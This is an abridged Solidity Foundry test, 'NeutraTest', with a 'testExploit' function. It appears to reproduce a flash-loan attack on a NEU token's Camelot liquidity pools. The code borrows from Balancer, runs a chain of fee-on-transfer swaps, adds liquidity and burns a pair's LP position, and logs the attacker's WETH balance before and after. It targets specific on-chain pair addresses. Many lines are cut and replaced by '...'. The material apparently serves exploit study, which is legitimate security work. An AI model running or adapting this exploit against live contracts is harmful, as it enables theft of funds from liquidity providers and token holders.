...
contract NeutraTest is Test {
    ...
    ICamelotPair Pair = ICamelotPair(0x65eBC8Cfd2aF1D659ef2405a47172830180Ba440);
    ICamelotPair Pair2 = ICamelotPair(0x2ea3CA79413C2EC4C1893D5f8C34C16acB2288A4);
    ...
    function testExploit() public {
        ...
        console.log("Attacker WETH Balance at start:", WETH.balanceOf(address(this)));

        flashBalancer();

        console.log("Attacker WETH Balance at end:", WETH.balanceOf(address(this)) / 1e18);
    }
    ...
    function receiveFlashLoan(
        ...
        console.log("Attacker WETH Balance after flashloan:", WETH.balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(NEU);
        Camelot.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0.15 ether, 0, path, address(this), address(this), block.timestamp + 1000
        );
        console.log("------------------------------");
        ...
        Camelot.addLiquidity(
            address(WETH), address(NEU), 0.15 ether, neuAmount, 0, 0, address(this), block.timestamp + 1000
        );
        ...
        Camelot.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            849 ether, 0, path, address(this), address(this), block.timestamp + 1000
        );
        ...
        Camelot.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            neuAmount, 0, path, address(this), address(this), block.timestamp + 1000
        );
        neuAmount = NEU.balanceOf(address(this));
        console.log("------------------------------");
        ...
        (uint256 amount0, uint256 amount1) = Pair2.burn(address(this));
        ...
        uint256 neu2Amount = NEU2.balanceOf(address(this));
        Camelot.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            neu2Amount, 0, path2, address(this), address(this), block.timestamp + 1000
        );
    ...
    function flashBalancer() internal {
        ...
        bytes memory userData = "";
        Balancer.flashLoan(recipient, tokens, amounts, userData);
    }
}
